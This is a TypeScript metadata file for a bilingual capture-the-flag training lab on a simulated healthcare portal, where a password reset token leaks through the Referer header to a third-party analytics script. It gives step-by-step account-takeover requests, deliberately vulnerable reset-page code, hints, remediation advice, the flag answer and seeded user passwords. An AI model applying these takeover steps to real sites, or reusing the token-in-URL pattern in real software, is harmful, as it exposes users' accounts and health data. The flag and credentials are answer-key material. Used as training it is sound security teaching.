// src/modules/practice-labs/broken-auth/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const brokenAuthLab3Metadata: LabMetadata = {
  slug: 'broken-auth-reset-token-referer-leak-healthcare',
  title:
    'Broken Auth: Password Reset Token Leak via Referer Header — Healthcare Portal',
  ar_title:
    'Broken Auth: تسريب توكن إعادة التعيين عبر Referer — البوابة الصحية',
  description:
    'Exploit a broken authentication vulnerability in a healthcare portal where the password reset token is included in the URL as a query parameter. When the user clicks an external link on the reset page, the token leaks via the HTTP Referer header — allowing account takeover.',
  ar_description:
    'استغل ثغرة مصادقة مكسورة في بوابة صحية حيث يتم تضمين توكن إعادة تعيين كلمة المرور في URL كمعامل استعلام. عند نقر المستخدم على رابط خارجي في صفحة إعادة التعيين، يتسرب التوكن عبر Referer header — مما يتيح الاستيلاء على الحساب.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'Broken Authentication',
    'Token Leakage',
    'Referer Header Attack',
    'Password Reset Flaws',
    'Information Disclosure',
  ],
  xpReward: 260,
  pointsReward: 130,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: "The doctor's password reset link is: /reset-password?token=<SECRET>. The reset page loads an external analytics script. Intercept the token leaked via the Referer header to the external server, then use it to reset the doctor's password.",
  ar_goal:
    'رابط إعادة تعيين كلمة مرور الطبيب هو: /reset-password?token=<SECRET>. تحمّل صفحة إعادة التعيين سكريبت تحليلات خارجي. التقط التوكن المسرَّب عبر Referer header للخادم الخارجي، ثم استخدمه لإعادة تعيين كلمة مرور الطبيب.',

  briefing: {
    en: `MediCare — patient portal. Medical records, appointment booking, prescription history.
doctor@medicare.io forgot their password.
The system sends a reset link.
https://medicare.io/reset-password?token=a1b2c3d4e5f6...
They click the link.
The page loads.
In the HTML of that page: a third-party analytics script.
<script src="https://analytics.thirdparty.io/track.js">
When the browser loads that script, it sends a GET request to analytics.thirdparty.io.
In that GET request: a Referer header.
Referer: https://medicare.io/reset-password?token=a1b2c3d4e5f6...
The analytics server now has the reset token.
In its access logs.
In its database.
Forever.
You control the analytics server.
Or you can read its logs.
The token is yours.`,
    ar: `MediCare — بوابة المرضى. السجلات الطبية، حجز المواعيد، تاريخ الوصفات.
نسي doctor@medicare.io كلمة مروره.
يرسل النظام رابط إعادة تعيين.
https://medicare.io/reset-password?token=a1b2c3d4e5f6...
ينقر على الرابط.
تتحمّل الصفحة.
في HTML تلك الصفحة: سكريبت تحليلات خارجي.
<script src="https://analytics.thirdparty.io/track.js">
عندما يحمّل المتصفح ذلك السكريبت، يرسل طلب GET إلى analytics.thirdparty.io.
في ذلك الطلب GET: هيدر Referer.
Referer: https://medicare.io/reset-password?token=a1b2c3d4e5f6...
الخادم التحليلي الآن لديه توكن إعادة التعيين.
في سجلات وصوله.
في قاعدة بياناته.
إلى الأبد.
أنت تتحكم في الخادم التحليلي.
أو يمكنك قراءة سجلاته.
التوكن ملكك.`,
  },

  stepsOverview: {
    en: [
      'POST /auth/request-reset { "email": "doctor@medicare.io" } — trigger password reset for the doctor',
      'Understand the vulnerability: reset URL format is /reset-password?token=<SECRET>',
      'The reset page HTML loads: <script src="https://analytics.thirdparty.io/track.js">',
      'Simulate victim visiting reset page via /auth/simulate-page-visit — browser fires GET to analytics with Referer containing full URL + token',
      'GET /analytics/logs — the analytics server logged the Referer with the embedded token',
      'POST /auth/do-reset { "token": "<leaked>", "newPassword": "hacked!" } → doctor account taken over → flag',
    ],
    ar: [
      'POST /auth/request-reset { "email": "doctor@medicare.io" } — شغّل إعادة تعيين كلمة المرور للطبيب',
      'افهم الثغرة: تنسيق URL إعادة التعيين هو /reset-password?token=<SECRET>',
      'HTML صفحة إعادة التعيين تحمّل: <script src="https://analytics.thirdparty.io/track.js">',
      'محاكاة زيارة الضحية لصفحة إعادة التعيين عبر /auth/simulate-page-visit — المتصفح يرسل GET للتحليلات مع Referer يحتوي URL الكامل + التوكن',
      'GET /analytics/logs — سجّل خادم التحليلات الـ Referer مع التوكن المضمَّن',
      'POST /auth/do-reset { "token": "<leaked>"، "newPassword": "hacked!" } → استولى على حساب الطبيب → العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'MediCare password reset embeds the token in the URL as a query parameter. The reset page includes a third-party analytics script that fires when the page loads. The browser automatically includes the full page URL in the Referer header of any sub-resource request (script, image, CSS). The analytics server logs all requests including Referer — the reset token is fully exposed in those logs.',
    vulnerableCode:
      '// Password reset email sends:\n' +
      '// https://medicare.io/reset-password?token=RESET_TOKEN_HERE\n' +
      '// ❌ Token in URL = leaks in Referer, browser history, server logs\n\n' +
      '// Reset page HTML (vulnerable):\n' +
      '<html>\n' +
      '  <!-- ❌ Third-party script receives full URL including token in Referer! -->\n' +
      '  <script src="https://analytics.thirdparty.io/track.js"></script>\n' +
      '  <form action="/auth/do-reset" method="POST">\n' +
      '    <input type="hidden" name="token" value="{{ token }}" />\n' +
      '  </form>\n' +
      '</html>',
    exploitation:
      '1. POST /auth/request-reset { "email": "doctor@medicare.io" } → reset initiated\n' +
      '2. POST /auth/simulate-page-visit → browser-like behavior: loads reset page, fires analytics script with Referer\n' +
      '3. GET /analytics/logs → find entry with Referer: "https://medicare.io/reset-password?token=<SECRET>"\n' +
      '4. POST /auth/do-reset { "token": "<SECRET>", "newPassword": "hacked!" } → 200 OK\n' +
      '5. POST /auth/login { "email": "doctor@medicare.io", "password": "hacked!" } → JWT + flag',
    steps: {
      en: [
        'POST /auth/request-reset { "email": "doctor@medicare.io" } → reset token generated and stored',
        'POST /auth/simulate-page-visit → simulates victim loading reset page → analytics script fires with Referer header',
        'GET /analytics/logs → entry: { "referer": "https://medicare.io/reset-password?token=abc123secret", "timestamp": "..." }',
        'Extract token: "abc123secret" from the Referer URL',
        'POST /auth/do-reset { "token": "abc123secret", "newPassword": "h4cked123!" } → 200 OK',
        'POST /auth/login { "email": "doctor@medicare.io", "password": "h4cked123!" } → admin JWT → flag: FLAG{BROKEN_AUTH_RESET_TOKEN_URL_REFERER_LEAK_HEALTHCARE}',
      ],
      ar: [
        'POST /auth/request-reset { "email": "doctor@medicare.io" } → تم توليد وتخزين توكن إعادة التعيين',
        'POST /auth/simulate-page-visit → يحاكي تحميل الضحية لصفحة إعادة التعيين → يُشغَّل سكريبت التحليلات مع Referer header',
        'GET /analytics/logs → مدخل: { "referer": "https://medicare.io/reset-password?token=abc123secret"، "timestamp": "..." }',
        'استخرج التوكن: "abc123secret" من URL الـ Referer',
        'POST /auth/do-reset { "token": "abc123secret"، "newPassword": "h4cked123!" } → 200 OK',
        'POST /auth/login { "email": "doctor@medicare.io"، "password": "h4cked123!" } → JWT الطبيب → العلم: FLAG{BROKEN_AUTH_RESET_TOKEN_URL_REFERER_LEAK_HEALTHCARE}',
      ],
    },
    fix: [
      'Tokens in POST body or headers ONLY: never put sensitive tokens in URLs (they appear in Referer, browser history, server logs, CDN logs)',
      'Correct reset flow: reset link → POST to API with token in body → server validates and renders form → new password submitted',
      'Referrer-Policy header: set "Referrer-Policy: no-referrer" on the reset page to prevent Referer leakage as a secondary defense',
      'No third-party scripts on sensitive pages: reset pages, payment pages, and profile pages must not load any external resources',
    ],
  },

  postSolve: {
    explanation: {
      en: "The Referer header is an often-overlooked information leakage vector. Browsers automatically include the full URL of the current page in the Referer header of any outgoing request — including script loads, image loads, and CSS loads. Putting a secret token in the URL is fundamentally unsafe because the URL is observable by: the browser's history, server access logs, CDN logs, analytics platforms, and any third-party resource loaded by the page.",
      ar: 'هيدر Referer هو متجه تسريب معلومات يُغفَل عنه كثيراً. تقوم المتصفحات تلقائياً بتضمين URL الكامل للصفحة الحالية في Referer header لأي طلب صادر — بما في ذلك تحميلات السكريبت والصور والـ CSS. وضع توكن سري في URL غير آمن جوهرياً لأن URL مرئي لـ: تاريخ المتصفح، سجلات وصول الخادم، سجلات CDN، منصات التحليلات، وأي مورد خارجي يحمّله الصفحة.',
    },
    impact: {
      en: 'Healthcare account takeover: the attacker gains access to patient medical records, prescription history, appointment scheduling, and personal health information — all protected under healthcare privacy regulations (HIPAA, GDPR). The token leaked silently with zero interaction beyond a normal page visit.',
      ar: 'الاستيلاء على حساب رعاية صحية: يحصل المهاجم على وصول للسجلات الطبية للمرضى، تاريخ الوصفات، جدولة المواعيد، والمعلومات الصحية الشخصية — كلها محمية بموجب لوائح خصوصية الرعاية الصحية (HIPAA، GDPR). تسرَّب التوكن بصمت بدون أي تفاعل يتجاوز زيارة الصفحة العادية.',
    },
    fix: [
      'POST-redirect pattern: email link goes to landing page → token submitted via POST body to API → never in URL',
      'Referrer-Policy: no-referrer on reset pages: even if token is in URL, this header prevents the browser from including it in Referer',
      'No external resources on sensitive pages: security-critical pages (reset, payment, MFA) must be completely self-contained',
      'Short token validity: reset tokens must expire in 15-30 minutes — even if leaked, the window is narrow',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'Trigger a password reset for doctor@medicare.io via POST /auth/request-reset. The reset link format is /reset-password?token=<SECRET>. Notice: the token is in the URL as a query parameter.',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'The reset page loads an external analytics script. When the browser requests that script, it sends the full page URL in the Referer header. Call /auth/simulate-page-visit to simulate this.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'After simulating the page visit, GET /analytics/logs. Find the entry where the Referer contains the full reset URL including the token. Extract the token value.',
    },
    {
      order: 4,
      xpCost: 75,
      content:
        'POST /auth/do-reset { "token": "<extracted_token>", "newPassword": "hacked!" }. Then login as doctor@medicare.io to get the flag.',
    },
  ],

  flagAnswer: 'FLAG{BROKEN_AUTH_RESET_TOKEN_URL_REFERER_LEAK_HEALTHCARE}',
  initialState: {
    users: [
      {
        username: 'doctor_hassan',
        password: 'Doc_H4ss4n_2024!',
        role: 'doctor',
        email: 'doctor@medicare.io',
      },
      {
        username: 'patient_sara',
        password: 'sara123',
        role: 'patient',
        email: 'sara@medicare.io',
      },
    ],
  },
};
